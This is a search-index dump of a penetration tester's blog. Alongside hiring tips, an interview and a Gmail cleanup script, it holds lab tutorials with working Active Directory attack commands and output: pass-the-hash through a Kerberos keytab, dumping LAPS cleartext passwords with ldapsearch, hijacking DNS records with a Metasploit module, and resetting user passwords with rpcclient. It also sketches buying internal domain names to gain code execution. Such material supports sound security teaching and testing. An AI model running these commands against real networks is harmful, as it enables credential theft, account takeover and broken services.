List","uri":"https://malicious.link/posts/2018/2018-bhdcbslv-hiring-list/"},{"categories":null,"content":"This blog post may be of limited use, most of the time, when you have an NTLM hash, you also have the tools to use it. But, if you find yourself in a situation where you don’t have the tools and do happen to have kerberos tools, you can pass the hash with it. Lets say with have the NTLM hash for the user uberuser and the hash is 88e4d9fabaecf3dec18dd80905521b29. The first step to do so is to create a keytab file using ktutil: root@wpad:~# ktutil At the ktutil prompt, type in the “add entry” (addent) command with the “principals” (-p) flag. Specify the user and an all uppercase version of the FQDN. Then the “KVNO” (-k 1), which is the key number. Finally the encryption type, which is rc4-hmac for NTLM hashes: ktutil: addent -p uberuser@CORP.SOMEWHATREALNEWS.COM -k 1 -key -e rc4-hmac After you hit enter you’ll get prompted for the rc4-hmac (NTLM) hash: Key for uberuser@CORP.SOMEWHATREALNEWS.COM (hex): 88e4d9fabaecf3dec18dd80905521b29 Then we write the keytab file to disk and exit ktutil ktutil: wkt /tmp/a.keytab ktutil: exit The last step before we can use our authentication is to create a kerberos ticket using our keytab file. root@wpad:~# kinit -V -k -t /tmp/a.keytab -f uberuser@CORP.SOMEWHATREALNEWS.COM Using default cache: /tmp/krb5cc_0 Using principal: uberuser@CORP.SOMEWHATREALNEWS.COM Using keytab: /tmp/a.keytab Authenticated to Kerberos v5 Validate it with klist: root@wpad:~# klist Ticket cache: FILE:/tmp/krb5cc_0 Default principal: uberuser@CORP.SOMEWHATREALNEWS.COM Valid starting Expires Service principal 07/22/2018 21:38:43 07/23/2018 07:38:43 krbtgt/CORP.SOMEWHATREALNEWS.COM@CORP.SOMEWHATREALNEWS.COM renew until 07/23/2018 21:38:40 ","date":"2018-07-24","objectID":"https://malicious.link/posts/2018/pass-the-hash-with-kerberos/:0:0","tags":["kerberos","pth"],"title":"Pass the Hash with Kerberos","uri":"https://malicious.link/posts/2018/pass-the-hash-with-kerberos/"},{"categories":null,"content":"In early August of 2017 I posted a few tips to Twitter regarding interviewing and getting hired in general. I’ pasting them here to preserve them. I only had 140 characters to make these, and I think there is a lot more you can do, but 30 tips is a good start. Don’t post obvious CFAA violations to social media If you go in without a job and a chip on your shoulder, you’ll leave the same way If you don’t ask follow up questions, I won’t have any either, like “would you like the job?” Exaggerating on your resume isn’t a good idea, but if you do, be ready to explain it The company is going to look at your social media. Privacy concerns? Don’t post publicly. Don’t get sassy in the interview about it. Dropping a vuln in the company during the interview is a stupid move. (Personal experience) Your attire matters. If you look like you just got out of bed, I’ll probably just let you go back to it. Being honest about not knowing something is great. Emailing after the interview that you researched it and now understand it is AWESOME! It is always ok to ask why you didn’t get the job and where you can improve. Unfortunately straight answers aren’t always possible. Like college, trying many types of Infosec jobs will make you better at all of them. Stay humble. If you were referred by a friend that works there already, respect the fact that you are representing them as well. Making money is better than not. If you think you are too good to be a Walmart greeter, you are probably too good for this job too. Try not to take it personally if you don’t get the job today. You might be able to apply later. You won’t if you lash out. Contributions to open source projects isn’t required, but is a good way to demonstrate values, skills, and mindset. Don’t whine and complain during an interview. It’s ok to point out deficiencies, or answer why you left your last job but keep it brief. Set expectations and ask questions like: Can I ping you if I haven’t heard from you in a week? What should I wear to the interview Minimal self deprecation is fine, but if you spend the whole interview talking about how much you suck, I’ll believe it. Include “Selected Accomplishments” part in your resume. 2-4 things that you are particularly proud of, doesn’t have to be done at work. The question “where do you want to be / doing 2/4/10 years” is a standard question. “I don’t know” is ok, but a prepared answer is better. Sarcasm is taken differently by everyone. Might go over good or bad. If it’s how you deal w/ nervousness, practice interviewing more. Practice interviewing. Find someone that will give you candid feedback and interview for positions you want with them. Don’t take an interview call in a crowded or loud place. Rescheduling is totally ok as long as it’s done with more than 24 hours notice. The saying “It’s not what, but who you know” is unfortunately true a lot of times. But it is because who you know can vouch for what you know. Just because someone is a manager doesn’t mean they can’t run circles around you technically and are just acting dumb. (Personal experience) If your LinkedIn profile does not match up with your resume, you will probably be asked about it. (i.e. degree, certs, jobs mismatch) Ask about travel and feel free to ask to talk to potential co-workers about travel and other topics to get the ground truth. Offer letters and nearly all hiring / new-hire documents are contracts. You can “X” out anything you don’t agree with. $employer will have to approve the change. When asked to list one or more strengths or weaknesses: Strengths: stay humble, Weaknesses: share how you are working to get better Everything on the Internet is suspect. Trust but verify right? Learn things for yourself. Blog, tweet, share how/what you learned. YMMV. Have some yourself? I would love to add it! Please just tweet a reply via Twitter to me and I’ll get it added. Thanks! ","date":"2018-07-22","objectID":"https://malicious.link/posts/2018/getting-hired-a-few-tips/:0:0","tags":["interview","hiring"],"title":"Getting Hired: A Few Tips","uri":"https://malicious.link/posts/2018/getting-hired-a-few-tips/"},{"categories":null,"content":"For nearly a year I left a CoinHive miner up on the blog so that people that didn’t feel like or couldn’t afford a way to support the blog could do so via a bit of CPU power. Unfortunately during that time lots of malware started to use services like coinhive and I quickly started recieving warning that my site had been “hacked” or was showing up as malicious (har har). Well, finally got off my butt and removed it. Sorry to my readers who had to deal with it. More later! Lots of fun stuff to come. ","date":"2018-07-09","objectID":"https://malicious.link/posts/2018/a-few-changes/:0:0","tags":["rant"],"title":"A Few Changes","uri":"https://malicious.link/posts/2018/a-few-changes/"},{"categories":null,"content":" Created the 2018 UNOFFICIAL ShmooCon Hiring List. To get on the list is even easier now! Just complete the following form: https://goo.gl/forms/aDRYaH5wubSqWcUk1 (One small tip, first come first serve, so if you want to be on the top of the list it’s best to submit the best info you have vs waiting on anyone, I don’t change the list order for anyone.) Direct Link to Google Doc: https://docs.google.com/spreadsheets/d/10BXjzS1KsaWFkQkAjlox3Chrk5wD1lgUf1RWi50Jiso/ ","date":"2017-12-28","objectID":"https://malicious.link/posts/2017/2018-shmoocon-hiring-list/:0:0","tags":["shmoocon","hiring"],"title":"2018 ShmooCon Hiring List","uri":"https://malicious.link/posts/2017/2018-shmoocon-hiring-list/"},{"categories":null,"content":"My talk today at Wild West Hacking Fest was about some documents that I released here. I’ll make this blog post more indepth later but for right now I wanted to get the slides out. (If you can’t access one of the documents yet, don’t ask for permission to do so, it just means either they aren’t ready yet, I’ll make posts about each one as they become available) Here is the main slide deck for the docs: https://bit.ly/OpenSourcePentest Here are the slides for the release talk (not the same as the link above): ","date":"2017-10-27","objectID":"https://malicious.link/posts/2017/open-source-pentesting/:0:0","tags":["wwhf","conference","pentesting","slides"],"title":"Open Source Pentesting","uri":"https://malicious.link/posts/2017/open-source-pentesting/"},{"categories":null,"content":"Created the 2017 UNOFFICIAL GrrCon Hiring List. To get on the list is even easier now! Just complete the following form: https://goo.gl/forms/ddfN6gHPbCJweGUw2 (One small tip, first come first serve, so if you want to be on the top of the list it’s best to submit the best info you have vs waiting on anyone, I don’t change the list order for anyone.) Direct Link to Google Doc: https://docs.google.com/spreadsheets/d/18YEyfp3ctrCz3WgaCArKp0wLn0xWEfV99X-UDmhy4D0/ ","date":"2017-10-16","objectID":"https://malicious.link/posts/2017/2017-grrcon-hiring-list/:0:0","tags":["grrcon","hiring"],"title":"2017 GrrCon Hiring List","uri":"https://malicious.link/posts/2017/2017-grrcon-hiring-list/"},{"categories":null,"content":"Like many of you I’m a gmail hoarder. I never deleting anything, just “archive” everything. I “might” need it later, or “I’ll get to it when I have time”. If we get really honest with ourselves, we never will actually get to it, and because we have this buffer, this procrastination opportunity, we grab it. We use words like “but I may need proof of X”, or “I could need to reference this”, or “I don’t really want to put this person in my contacts so I’ll just save the email”. Personally I have made a choice to force myself to be more engaged in my email going forward. I have set a Google Script to run through all of my email every day and if it is older than 90 days, and doesn’t have the specail label “keep” on it, it’s gone. I obviously didn’t care enough about whatever was going on in that email to take the time to respond to it. Whatever your reason for finding this post, here is how I got it done: At first I started with just searching for a way to make a simple filter to do this. There are plenty of blog posts that show you this is possible, but it turns out that at some point Gmail switched to only applying filters to incoming messages (makes sense, lots less overhead, no need to load EVERYONEs email every hour). This makes deleting messages older than X impossible with simple filters however. I did however learn of a search query term you can use to find messages/threads older than X. Imaginatively called older_than:. So a search in Gmail for older_than:90d resulted in exactly the emails I wanted to find. That’s when I started looking into Google Scripting. The language is pretty easy and straight forward if you have ever programmed in anything like Javascript or C++. Using the API reference here: https://developers.google.com/apps-script/reference/gmail/ I was able to cobble together the following in about 20 minutes: function DeleteOldEmail () { var threads; var thread; threads = GmailApp.search(\"older_than:90d\"); for(var i = 0; i \u003c threads.length; i++) { var thread = threads[i]; GmailApp.moveThreadToTrash(thread); } } Now, that script leaves a lot to be desired. It doesn’t have any case where a label like “save” or “keep” might come into play, it just hauls off and deletes everything old. But before we start improving lets show you how it looks when you’re actually doing it (I’ll comment out the “moveThreadToTrash in the screenshots) Go to https://script.google.com/ and you’ll be presented with a new project if you haven’t been here before: Then, copy and past the code in and save it. It’ll ask you to name the project. I just named it DeleteOldEmail. Feel free to name it anything you wish. It is what is going to show up in your Google Security “Approve Apps” list. The first time I ran this I commented out the lines for deleting and added in a “Logger” line just so I knew what would be deleted: function DeleteOldEmail () { var threads; var thread; threads = GmailApp.search(\"older_than:90d\"); for(var i = 0; i \u003c threads.length; i++) { var thread = threads[i]; Logger.log(thread.getFirstMessageSubject()) //GmailApp.moveThreadToTrash(thread); } } Then run it, the first time you run it, it will ask for permissions: If you try this out and decide you don’t like it you can revoke the permissions here: https://myaccount.google.com/permissions If you went with the logging you’ll see something like this if you go to View-\u003eLogs: Last step is to set this up so it automatically runs, I mean that’s the whole point. For that, we go to Edit-\u003eCurrent Project’s Triggers. And we are greeted with the following (once we click to add a new trigger): I chose to set up mine to run every 12 hours, but you can set it to run once a day, once a week, whatever. Again, this script leaves a lot to be desired, You can totally mess with the query search string any way you wish. I’ve created a Github repository that I’ll put improvements on the script: https://github.com/mubix/GScriptOldEmal Have fun with it. The two improvments I’ll be adding are the l","date":"2017-10-12","objectID":"https://malicious.link/posts/2017/automatically-deleting-old-gmail-mail/:0:0","tags":["gmail","scripting","cleanup"],"title":"Automatically deleting old Gmail email","uri":"https://malicious.link/posts/2017/automatically-deleting-old-gmail-mail/"},{"categories":null,"content":"Created the 2017 UNOFFICIAL DerbyCon Hiring List. To get on the list is even easier now! Just complete the following form: https://goo.gl/forms/vyqVHjZkxE4WhA9X2 (One small tip, first come first serve, so if you want to be on the top of the list it’s best to submit the best info you have vs waiting on anyone, I don’t change the list order for anyone.) Direct Link to Google Doc: https://docs.google.com/spreadsheets/d/1tf0C09Cwt6_GBinOjvI714655YdQcxi5k2g6iDzPt9I/ ","date":"2017-08-13","objectID":"https://malicious.link/posts/2017/2017-derbycon-hiring-list/:0:0","tags":["derbycon","hiring"],"title":"2017 DerbyCon Hiring List","uri":"https://malicious.link/posts/2017/2017-derbycon-hiring-list/"},{"categories":null,"content":" If you’ve ever been pentesting an organization that had LAPS, you know that it is the best solution for randomizing local administrator passwords on the planet. (You should just be leaving them disabled). LAPS stores it’s information in Active Directory: The expiration time: ms-Mcs-AdmPwdExpirationTime: 131461867015760024 And the actual password in clear text: ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#( When LAPS first came it, any user in Active Directory could read it. Microsoft fixed that, you now have to have the All extended rights permission to the object or Full Control of it. In many organizations, there are pockets of OU admins, or even standard users that are in charge of a specific set of Users and (in particular) computers in which they have full control over. There is already a Metasploit module thanks to Meatballs: https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb. But, unfortunately I don’t always have access to a Meterpreter session to run the module. Using ldapsearch (which is included in the package ldapscripts on Debian/Ubuntu) can be used to make the same query that the module does. Here is an example run: ldapsearch -x -h 192.168.80.10 -D \\ \"helpdesk\" -w ASDqwe123 -b \"dc=sittingduck,dc=info\" \\ \"(ms-MCS-AdmPwd=*)\" ms-MCS-AdmPwd Lets break this down: -x - Use basic authentication -h 192.168.80.10 - Connect to the Domain Controller for ldap -D \"helpdesk\" -w ASDqwe123 - Login as the helpdesk user, with the password ASDqwe123 -b \"dc=sittingduck,dc=info\" - This loads the base LDAP object of the entire domain. \"(ms-MCS-AdmPwd=*)\" - Filter out any objects that I can’t see a value for ms-MCS-AdmPwd for. (If you have rights as that user to see even one Administrator password, this will show it.) ms-MCS-AdmPwd - Only show me the ms-MCS-AdmPwd object (which by default includes the object name and DN so you will still know what host it belongs to) What does that look like? $ ldapsearch -x -h 192.168.80.10 -D \"helpdesk\" -w ASDqwe123 -b \"dc=sittingduck,dc=info\" \"(ms-MCS-AdmPwd=*)\" ms-MCS-AdmPwd # extended LDIF # # LDAPv3 # base \u003cdc=sittingduck,dc=info\u003e with scope subtree # filter: (ms-MCS-AdmPwd=*) # requesting: ms-MCS-AdmPwd # # DC1, Domain Controllers, sittingduck.info dn: CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info ms-Mcs-AdmPwd: 2F1i/++N0H+G]{Y\u0026,F # SDCLIENT_DAWIN7, LabComputers, Lab, sittingduck.info dn: CN=SDCLIENT_DAWIN7,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info ms-Mcs-AdmPwd: 8CDR4,2UE8BA{zw2@RR # SD_WSUS_2012, LabComputers, Lab, sittingduck.info dn: CN=SD_WSUS_2012,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info ms-Mcs-AdmPwd: +3!UY5@g9B.64RV2z/T # WIN-PM0ID6F0AHN, LabComputers, Lab, sittingduck.info dn: CN=WIN-PM0ID6F0AHN,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#( # search reference ref: ldap://research.sittingduck.info/DC=research,DC=sittingduck,DC=info # search reference ref: ldap://ForestDnsZones.sittingduck.info/DC=ForestDnsZones,DC=sittingduck,D C=info # search reference ref: ldap://DomainDnsZones.sittingduck.info/DC=DomainDnsZones,DC=sittingduck,D C=info # search reference ref: ldap://sittingduck.info/CN=Configuration,DC=sittingduck,DC=info # search result search: 2 result: 0 Success Now, just having the local admin password doesn’t ensure that it’s enabled, but there is a good bet that you are good to go now. P.S. You can also authenticate using Kerberos (think Golden/Silver tickets) P.P.S Because Windows doesn’t (to the best of my knowledge) require signing on Domain Controllers for LDAP connections yet (probably does in 2016 or will soon), with a little bit of coding you can get ntlmrelayx to dump LAPS passwords ;-) ","date":"2017-07-24","objectID":"https://malicious.link/posts/2017/dump-laps-passwords-with-ldapsearch/:0:0","tags":["defcon","blackhat","ldapsearch","LAPS"],"title":"Dump LAPS passwords with ldapsearch","uri":"https://malicious.link/posts/2017/dump-laps-passwords-with-ldapsearch/"},{"categories":null,"content":"Soon after I blogged about the “Snagging Creds from Locked Machines” and it went a bit viral for a day, Pierluigi Paganini from SecurityAffairs.co asked me some great questions, that I failed to answer in a timely manner. They are probably a lot less useful to him now (8 months late), but I thought I would answer them anyways. ","date":"2017-07-03","objectID":"https://malicious.link/posts/2017/security-affairs-questions/:0:0","tags":["securityaffairs","news","questions"],"title":"Security Affairs Questions","uri":"https://malicious.link/posts/2017/security-affairs-questions/"},{"categories":null,"content":"You are one of the most respected experts on cyber security. Could you tell me what your technical background is and when you started hacking? I think my earliest “hacking” was cheating at video games. I enjoyed learning the mechanics of how the Game Genie and GameShark worked, and how I could cheat at games much more than playing them. My parents always thought that I ruined the games, but it really was the figuring out how to get the right hex for infinite life or ammo that was the game for me. After that I owe my traditional IT / Security learning to the Marine Corps 0651 and 0656 schools, the amazingly patient Marines and civilians at the MARCERT, the OSCP and Chris Gates’ blog. ","date":"2017-07-03","objectID":"https://malicious.link/posts/2017/security-affairs-questions/:0:1","tags":["securityaffairs","news","questions"],"title":"Security Affairs Questions","uri":"https://malicious.link/posts/2017/security-affairs-questions/"},{"categories":null,"content":"What was your greatest hacking challenge? My “greatest hacking challenge” I would say is myself. Self awareness is an ever progressing goal, I attempt to figure out and make myself better every day. I fail at it a lot, but all the best hacks are pure and simple perseverance and I plan to never let this one have the better of me. ","date":"2017-07-03","objectID":"https://malicious.link/posts/2017/security-affairs-questions/:0:2","tags":["securityaffairs","news","questions"],"title":"Security Affairs Questions","uri":"https://malicious.link/posts/2017/security-affairs-questions/"},{"categories":null,"content":"What are the 4 tools that cannot be missed in the hacker’s arsenal and why? So much troll ammo in that question. Or I could go the philosophical route and talk about the mind, and never giving up, but I’ll take the question at face value: A programming language. Yes, you don’t have to know programming to be in “Information Security” but to be a “hacker” (in the sense of breaking into systems), knowing a language will save you when the tool that you need for a very specific use case just doesn’t exist. It also helps you when you run into a tool that is broken, that everyone seems to use, but for some reason you are the only one noticing it’s broken. An Intel NUC (or other computer) with ESXi (or other virtualization) on it. Having a lab, even on a hand-me-down laptop/computer with Virtualbox and trial copies of Windows, I was able to learn more by building whatever application I was trying break into, than I ever would have by poking at it from the Internet. A blog. I forget things all the time and I usually use my blog or another note taking method (pen and paper, text editor, telling friends about it), to be able to reference it later when I need it. Even if you are the only reader of your own blog it is hands down one of the best method of learning for me because it forces me to re-do things and revisit my assumptions. Metasploit. Mostly because it makes things dead simple, and learning to use it isn’t very hard. ","date":"2017-07-03","objectID":"https://malicious.link/posts/2017/security-affairs-questions/:0:3","tags":["securityaffairs","news","questions"],"title":"Security Affairs Questions","uri":"https://malicious.link/posts/2017/security-affairs-questions/"},{"categories":null,"content":"Which are the most interesting hacking communities on the web today? I’ve never really been welcome or even interested in the darker side of hacking communities. I would get caught if I even tried to dive into that world. To know one’s limitations is to know one’s self However, I run NoVAHackers with Chris Gates so I would be remiss to not mention it, and it’s parent AHA. Both are great communities with basically a mini-conference every month at the meetings. If you don’t have a hacker space, or “Hackers Association” in your area, first, look harder there probably is one that you just haven’t found yet, and second, if not, start it. I went to the first 2 or 3 meetings of NoVA Hackers by myself. Don’t be deterred by single digit membership or attendance. NoVA Hackers is near ~700 members + another 500 or so alumni since it started in 2009. ","date":"2017-07-03","objectID":"https://malicious.link/posts/2017/security-affairs-questions/:0:4","tags":["securityaffairs","news","questions"],"title":"Security Affairs Questions","uri":"https://malicious.link/posts/2017/security-affairs-questions/"},{"categories":null,"content":"Which is the industry (healthcare, automotive, telecommunication, banking, and so on) most exposed to cyber attacks and why? Honestly I don’t want to answer this. Why would you point at someone and say “hit him, he’s easier to take down” ","date":"2017-07-03","objectID":"https://malicious.link/posts/2017/security-affairs-questions/:0:5","tags":["securityaffairs","news","questions"],"title":"Security Affairs Questions","uri":"https://malicious.link/posts/2017/security-affairs-questions/"},{"categories":null,"content":"What scares you more in the Internet? The fact that people think it’s a weapon for or against them. ","date":"2017-07-03","objectID":"https://malicious.link/posts/2017/security-affairs-questions/:0:6","tags":["securityaffairs","news","questions"],"title":"Security Affairs Questions","uri":"https://malicious.link/posts/2017/security-affairs-questions/"},{"categories":null,"content":"We often hear about cyber weapons and cyber attacks against critical infrastructure. Do you believe concrete the risk of a major and lethal cyber attack against a critical infrastructure? Yes, but in what country? Is the U.S. even the most connected these days? I doubt it. In counter point I would like you to watch the following for actual statistics on the matter by @SpaceRogue: ","date":"2017-07-03","objectID":"https://malicious.link/posts/2017/security-affairs-questions/:0:7","tags":["securityaffairs","news","questions"],"title":"Security Affairs Questions","uri":"https://malicious.link/posts/2017/security-affairs-questions/"},{"categories":null,"content":"Why and which are the most exposed CI? Same issue with the industry question, not going to point at the weakest link. I guess an argument to the fact that making light of these targets helps to force action, but I think unless you have had your head in the sand every knows of “Cyber Threats” these days, and a heading like: Security Expert Rob Fuller says that Widgets are the most vulnerable target in U.S. Infrastructure doesn’t really further any message or get anyone’s attention to something they don’t already know. Thanks for your time. Have an awesome 4th of July. ","date":"2017-07-03","objectID":"https://malicious.link/posts/2017/security-affairs-questions/:0:8","tags":["securityaffairs","news","questions"],"title":"Security Affairs Questions","uri":"https://malicious.link/posts/2017/security-affairs-questions/"},{"categories":null,"content":"“Secure” DNS updates is the default in Windows, but there is an option to allow “Nonsecure” updates. I have seen this changed when non-Windows DHCP servers are used (eg Access Points), this opens a network up to some pretty nifty attacks that a Metasploit module just hit the ground for. ![](/images/2017/nonsecure_dns_updates.png)\rThe module was originally written by King Sabri, with many touch ups and the spoofing capability by busterbcook You can read up on the pull request in pr/#8599 Just to drive home the point I’ll be using my Exchange server as a target: **You will break email for the entire company if you do this on a live network. Doing so is possibly a resume generating event.**\r![](/images/2017/before_dns_update.png)\rIf you are going to be overwriting an existing record make sure to keep a note of the real IP address of the host you are overwriting so that you can fix the record afterwards. $ dig @192.168.80.10 sdexchange.sittingduck.info ;; ANSWER SECTION: sdexchange.sittingduck.info. 1200 IN A 192.168.80.13 Here is what the module looks like: msf \u003e use auxiliary/admin/dns/dyn_dns_update msf auxiliary(dyn_dns_update) \u003e show options Module options (auxiliary/admin/dns/dyn_dns_update): Name Current Setting Required Description ---- --------------- -------- ----------- CHOST no The source address to use for queries and updates DOMAIN yes The domain name HOSTNAME yes The name record you want to add IP no The IP you want to assign to the record RHOST yes The vulnerable DNS server IP address TYPE A yes The record type you want to add. (Accepted: A, AAAA, CNAME, TXT) VALUE no The string to be added with TXT or CNAME record Auxiliary action: Name Description ---- ----------- UPDATE Add or update a record. (default) It has 3 different actions, but you’ll mostly want UPDATE. UPDATE will automatically delete a record if it exists already and then add the record back with your specified settings. msf auxiliary(dyn_dns_update) \u003e show actions Auxiliary actions: Name Description ---- ----------- ADD Add a new record. Fail if it already exists. DELETE Delete an existing record. UPDATE Add or update a record. (default) Here are the settings I chose. Notice the IP address that I’m injecting isn’t on the same subnet as the domain. msf auxiliary(dyn_dns_update) \u003e set DOMAIN sittingduck.info DOMAIN =\u003e sittingduck.info msf auxiliary(dyn_dns_update) \u003e set HOSTNAME sdexchange HOSTNAME =\u003e sdexchange msf auxiliary(dyn_dns_update) \u003e set IP 100.100.100.100 IP =\u003e 100.100.100.100 msf auxiliary(dyn_dns_update) \u003e set RHOST 192.168.80.10 RHOST =\u003e 192.168.80.10 And the output: msf auxiliary(dyn_dns_update) \u003e run [+] Found existing A record for sdexchange.sittingduck.info [*] Sending dynamic DNS delete message... [+] The record 'sdexchange.sittingduck.info =\u003e 100.100.100.100' has been deleted! [*] Sending dynamic DNS add message... [+] The record 'sdexchange.sittingduck.info =\u003e 100.100.100.100' has been added! [*] Auxiliary module execution completed msf auxiliary(dyn_dns_update) \u003e ","date":"2017-06-25","objectID":"https://malicious.link/posts/2017/dynamic-dns-update-module/:0:0","tags":["dns","windows","ad"],"title":"Dynamic DNS Update Module","uri":"https://malicious.link/posts/2017/dynamic-dns-update-module/"},{"categories":null,"content":"#Game Over This will stay until fixed or another dynamic DNS update is performed from the original server (every 24 hours or so). ","date":"2017-06-25","objectID":"https://malicious.link/posts/2017/dynamic-dns-update-module/:1:0","tags":["dns","windows","ad"],"title":"Dynamic DNS Update Module","uri":"https://malicious.link/posts/2017/dynamic-dns-update-module/"},{"categories":null,"content":" Image showing how to allow users to be able to reset user passwords Disclaimer: If you are here because you are a helpdesk person, this is a pentest blog, so it’s coming from the mindset of a pentester, but this could just as easily be used for legitmate purposes. There are a great many things you can do with rpcclient for examples outside of this blog post see these posts by Chris Gates: Enumerating user accounts on Linux and OS X with rpcclient More of using rpcclient to find usernames more with rpcclient From LOW to PWNED [5] Honorable Mention: Null Sessions There have been plenty of times on pentests where I have had access to IT or helpdesk related accounts that had limited administrative powers. Almost always I or someone on the team found an internal wiki or share that they did have access to (and then we moved on from there), however they almost always have the ability to reset passwords. I was unable to find any documentation on how to do this from a Linux host, or at the very least to do it without Active Directory Users and Computers (ADUC), which would require a Windows machine. And figuring out how to run ADUC through a meterpreter sessions wasn’t an hurdle I ever had time for in engagements. :) Due to me being dumb and resetting a password of my own in my lab to something I couldn’t remember, I finally had the time to figure it out. If you have Samba client tools (smbclient) installed, you can use rpcclient. Out of the gate, you can auth with password or kerberos (this is especially useful in situations where you have dropped into a user that has an active kerberos token or you can make one): root@kali:~# rpcclient -U helpdesk //192.168.80.10 Enter helpdesk's password: rpcclient $\u003e If you have the package passing-the-hash, you can even do this with just a NTLM hash. In order to change a password you neet to use the setuserinfo2 command: rpcclient $\u003e setuserinfo2 Usage: setuserinfo2 username level password [password_expired] result was NT_STATUS_INVALID_PARAMETER You will not be able to change the password of anyone with AdminCount = 1 (aka Domain Admins and other high priv accounts): rpcclient $\u003e setuserinfo2 ima-domainadmin 23 'ASDqwe123' result: NT_STATUS_ACCESS_DENIED result was NT_STATUS_ACCESS_DENIED rpcclient $\u003e But you can very easily target users who have alternate admin accounts: rpcclient $\u003e setuserinfo2 adminuser 23 'ASDqwe123' rpcclient $\u003e Yes it would be nice if there was any sort of confirmation… The 23 came from this MSDN article If you have the package samba-common-bin you can also do this with the net command: root@kali:~# net rpc password adminuser -U helpdesk -S 192.168.80.10 Enter new password for adminuser: Enter helpdesk's password: root@kali:~# Huge thanks for Beto Solino of Impacket fame for his help figuring this out. ","date":"2017-06-23","objectID":"https://malicious.link/posts/2017/reset-ad-user-password-with-linux/:0:0","tags":["rpcclient","net","redteaming"],"title":"Reset AD user password with Linux","uri":"https://malicious.link/posts/2017/reset-ad-user-password-with-linux/"},{"categories":null,"content":"LanManager passwords (“LM”) is a very old and well known password hashing function. Used way back in OS/2 Warp and MS-Net (networking for MS-DOS). It was great in it’s day, however how it worked was not sustainable. The hashing was performed only haver uppercasing and splitting the password into two 7 character chunks. This meant that even if your password was 14 characters long, it was still technically only two 7 character passwords, that could be cracked separately. NTLM, it’s big brother came along with Windows NT (Windows 95 and Windows 98 did not have NTLM, and we don’t speak about Windows ME). Windows to this day stores both the LM and NTLM versions of passwords. This meant that if your password was under 15 characters it would still be stored in that LM crackable format (unless storage of LM is being prevented, which has become default). This is where the first “magic number” for passwords comes from. In many pentests I recommended in my reports that all sensitive passwords have a minimum of 15 characters. By doing this, no matter what the setting was for the storage of their passwords on whatever system they might be stored on, it would never be stored in LM. I even recommended it for normal users, but obviously that recommendation never stuck. Recently I discovered a new “magic number” for passwords: 28. Before I get into this, all of this information came from Atom (Hashcat primary developer) Solar Designer (John the Ripper) and Magnum (John the Ripper). I’m just putting it together because I had no idea this existed and I’ve been cracking passwords using both of these tools for ages. Huge thanks to them for all their help and patience. It turns out, that password cracking tools have maximum character lengths for passwords. This boggled my mind for a while but it makes total sense once Atom explained that it has to do with how the tools store the password candidates (dictionary words or generated clear texts to be used in the hash comparison attempt). They are stored in GPU registers, and unfortunately the speed of storing it there comes at a price. That price is that there isn’t enough registers to store candidates over certain lengths. The maximum lengths are specific to how each hashing function works so some maximum lengths are longer than others. The general rule of thumb at least in the world of Hashcat is 55 characters. UPDATE: The primary reason behind these specific length limits is that exceeding them doubles the amount of processing. The register pressure is a secondary aspect, and mostly limited to GPUs. (On CPUs, the candidate passwords themselves are not in registers.) – Solar Designer https://twitter.com/solardiz/status/861183622950334464 In the world of Windows however, passwords are stored using UTF16-LE. This means that password candidates are automatically double the character length as most other hashing functions, halving the possible maximum down to 27 characters. This means that lets say your password is a very well known quote like: You can’t handle the truth! who’s NTLM hash is E478B144E719CFF85A5F2028F0DF1808 you wouldn’t be able to crack it, even if it was in your dictionary, because it’s 28 characters. This limitation extends to any UTF16 based hash (which almost all Windows based hashing is) How do you know what the limits are? Well John the Ripper has a handy dandy argument that tells you specifics of each format: root@crackingbox:/opt/jtr/run# ./john --list=format-details --format=nt NT 81 24 24 0002000f 43 MD4 256/256 AVX2 8x3 As you can see in the second column it says “81”. This is the maximum number of UTF8 characters that it can fit for that format type, but because John the Ripper supports up to the full standard of 3 bytes in UTF16, the maximum again, is 27 characters. You can read more here: https://github.com/magnumripper/JohnTheRipper/issues/2529 http://www.openwall.com/lists/john-users/2017/05/04/8 http://www.openwall.com/lists/john-users/2017/05/04/9 If you read through the","date":"2017-05-06","objectID":"https://malicious.link/posts/2017/05-06-2017-password-magic-numbers/:0:0","tags":["hashcat","john","password","cracking"],"title":"Password Magic Numbers","uri":"https://malicious.link/posts/2017/05-06-2017-password-magic-numbers/"},{"categories":null,"content":"Created the 2017 UNOFFICIAL ShmooCon Hiring List. To get on the list is even easier now! Just complete the following form: https://goo.gl/forms/egx5Iw7M6gI67yh02 (One small tip, first come first serve, so if you want to be on the top of the list it’s best to submit the best info you have vs waiting on anyone, I don’t change the list order for anyone.) Direct Link to Google Doc: https://docs.google.com/spreadsheets/d/1yzL7Y7TAP-b4Bu9j2pYsaB2VyTXEK0C_NJ19aezIFms/ ","date":"2017-01-05","objectID":"https://malicious.link/posts/2017/2017-shmoocon-hiring-list/:0:0","tags":["shmoocon","hiring"],"title":"2017 Shmoocon Hiring List","uri":"https://malicious.link/posts/2017/2017-shmoocon-hiring-list/"},{"categories":null,"content":"NOTE: I DID NOT ATTEMPT ANYTHING MORE THAN LOGGING AGAINST ANY OF THE DOMAINS I REGISTERED FOR THIS RESEARCH For anyone who knows me, they know that I’ve been obsessed with DNS for a long time. However, in this post I will show results of something I can’t quite explain. It all started with the following hypothesis: Windows systems make DNS/NetBIOS/LLMNR requests to find the domain controllers they logged into even when they are no longer attached to the domain. This has already been proven with attacks like MS15-011 and other attacks that aim to bypass BitLocker Full-Disk Encryption. So I added a twist, I thought that maybe, just maybe, that Windows will automatically add a .com on to the end of these requests when attempting to find them. If I buy these domains then there is a chance I can gain code execution using Group Policy or supplying logon scripts (BAT files). Why do I think this? Because of past Def Con talks like: DEFCON 19: Bit-squatting: DNS Hijacking Without Exploitation https://www.youtube.com/watch?v=aT7mnSstKGs DEFCON 21 - DNS May Be Hazardous to Your Health - Robert Stucke https://www.youtube.com/watch?v=ZPbyDSvGasw But… how on earth would you ever know what a internal domain controller is called? I started by searching for pastebin posts with %LOGONSERVER%. This netted a few results, but when I searched for the same thing on gist.github.com I found something pretty surprising: ","date":"2016-12-29","objectID":"https://malicious.link/posts/2016/buying-internal-domain-access/:0:0","tags":["dns"],"title":"Buying Internal Domain Access","uri":"https://malicious.link/posts/2016/buying-internal-domain-access/"},{"categories":null,"content":"Microsoft Yes, I found a gist by what seems to be a Microsoft employee: Source: 